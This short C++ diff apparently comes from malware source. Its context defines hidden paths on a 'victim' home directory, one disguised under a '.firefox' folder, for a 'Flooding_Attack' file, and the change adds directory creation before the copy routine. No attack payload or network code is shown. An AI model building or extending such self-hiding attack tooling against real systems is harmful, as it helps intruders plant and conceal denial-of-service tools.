@@ -21,6 +21,11 @@
 #define LOCATION_A "/home/victim/.etc/.module/Flooding_Attack"
 #define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"
 
+std::string dirnameOf(const std::string& fname) {
+    size_t pos = fname.find_last_of("\\/");
+    return (std::string::npos == pos) ? "" : fname.substr(0, pos);
+}
+
 bool hasFileAt(const char* path) {
     struct stat buffer;
     return stat(path, &buffer) == 0;
@@ -28,6 +33,7 @@ bool hasFileAt(const char* path) {
 
 // Copy a file from srcpath to dstpath.
 bool copyFile(const char* srcpath, const char* dstpath) {
+    mkdir(dirnameOf(dstpath).c_str(), 0700);
     std::ifstream src(srcpath, std::ios::binary);
     std::ofstream dst(dstpath, std::ios::binary);
     dst << src.rdbuf();
